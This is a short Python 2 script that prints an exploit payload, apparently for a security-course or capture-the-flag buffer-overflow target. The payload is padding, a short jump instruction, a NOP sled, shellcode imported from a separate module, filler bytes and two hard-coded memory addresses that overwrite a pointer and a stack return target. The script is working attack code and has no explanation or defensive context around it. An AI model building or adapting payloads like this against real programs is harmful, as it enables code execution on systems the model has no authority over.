from shellcode import shellcode
from struct import pack


print 'a'*4+ '\xeb\x06' + '\x90'*6  + shellcode + ' ' + '\xaa'*40 + pack("<I",0x80f3724) + pack("<I",0xbffe8efc) + ' ' + '\xaa'*4

